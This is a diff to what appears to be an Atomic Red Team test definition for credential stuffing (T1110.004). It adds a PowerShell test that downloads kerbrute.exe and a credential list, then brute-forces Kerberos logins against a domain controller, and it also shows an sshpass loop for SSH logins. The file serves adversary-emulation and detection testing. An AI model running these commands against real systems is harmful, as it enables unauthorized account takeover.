@@ -64,3 +64,37 @@ atomic_tests:
       cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
       for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
 
+- name: Brute Force:Credential Stuffing using Kerbrute Tool
+  description: |  
+    Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack
+  supported_platforms:
+  - windows
+  input_arguments:
+    domaincontroller:
+      description: Domain controller were test will be run
+      type: String
+      default: null
+    domain:
+      description: Domain where you will be testing
+      type: String
+      default: null
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      kerbrute.exe must exist in $env:temp
+    prereq_command: |
+      if (test-path $env:temp\kerbrute.exe){exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "$env:temp\kerbrute.exe"
+  - description: |
+      bruteforce.txt must exist in $env:temp
+    prereq_command: |
+      if (test-path $env:temp\bruteforce.txt){exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/src/bruteforce.txt?raw=true" -outfile "$env:temp\bruteforce.txt"
+  executor: 
+    name: powershell
+    elevation_required: false
+    command: |
+      cd $env:temp
+      .\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} $env:temp\bruteforce.txt      
